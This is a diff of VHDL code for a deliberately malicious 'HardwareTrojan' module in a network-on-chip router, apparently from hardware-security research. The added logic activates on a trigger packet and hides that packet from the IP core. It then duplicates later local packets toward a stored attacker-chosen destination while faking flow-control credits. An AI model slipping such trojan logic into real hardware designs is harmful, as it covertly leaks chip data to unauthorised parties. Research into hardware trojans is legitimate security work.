@@ -16,7 +16,9 @@ entity HardwareTrojan is
         reset :	 		in std_logic;
         
         data_in :	 	in regflit; 	-- to read the information on the local port
-        
+        destAddr :      in regmetadeflit;
+        dupHeader :     out regflit;
+
         --Switch Control Interface
         duplicate : 	out std_logic; 	-- to inform the SW that the packet must be duplicated
     	free : 			in regNport;
@@ -33,52 +35,71 @@ entity HardwareTrojan is
 
         --Local Buffer Interface
       	fakeCredit :	out std_logic;
-        maskPkg :       out std_logic
+        maskPkg_o :     out std_logic;
+        h :             in std_logic;
+        h_ack :         in std_logic
         );
 end HardwareTrojan;
 
 architecture HardwareTrojan of HardwareTrojan is
 
-type HTState is (S0, waiting, readDestination);
-signal nextState : HTState;
+type HTState is (S0, waiting, readDestination, waitPkg);
+signal state : HTState;
+signal destination : regmetadeflit;
+
+signal maskPkg : std_logic;
 
 begin
 
     process(clock, reset)
     begin
         if reset = '1' then
-            nextState <= S0;
-            maskPkg <= '1';
+            state <= S0;
+            destination <= (others=>'0');
         elsif rising_edge(clock) then
-            case nextState is
+            case state is
                 -- Reset state
                 when S0 =>
-                    nextState <= waiting;
+                    state <= waiting;
 
-                -- Waiting the awakening paket
+                -- Waiting the awakening packet
                 when waiting =>
-                    if configPkg(0) = '1' or configPkg(1) = '1' or configPkg(2) = '1' or configPkg(3) = '1' or configPkg(4) = '1' then
-                        nextState <= readDestination;
-                        maskPkg <= '0';
+                    if maskPkg = '0' then
+                        state <= readDestination;
                     else
-                        nextState <= waiting;
-                        maskPkg <= '1';
+                        state <= waiting;
                     end if;
 
+                -- Stores the Destination address to replace it in the duplicated packet
                 when readDestination =>
-                    nextState <= readDestination;
+                    destination <= destAddr;
+                    state <= waitPkg;
+
+                -- Waits until the LOCAL IP send a new packet
+                when waitPkg =>
+
+                    state <= waitPkg;
 
                 when OTHERS =>
-                    nextState <= S0;
+                    state <= S0;
             end case;
         end if;
     end process;
 
+    -- Duplicated packet header
+    dupHeader <= x"00" & destination;
+
+    -- Controle de fluxo combinado de ambos os pacotes
     fakeCredit <= '1';
 
+    -- Informa o Switch Control que ele deve rotear os próximos pacotes locais para duas saídas
+    duplicate <= '1' when state = waitPkg else '0';
 
     data_out <= (others=> '0');
     dataSel <= '0';
 
+    -- Mascara o pacote de configuração para o IP!
+    maskPkg <= '0' when configPkg(0) = '1' or configPkg(1) = '1' or configPkg(2) = '1' or configPkg(3) = '1' or configPkg(4) = '1' else '1';
+    maskPkg_o <= maskPkg;
 
 end HardwareTrojan;
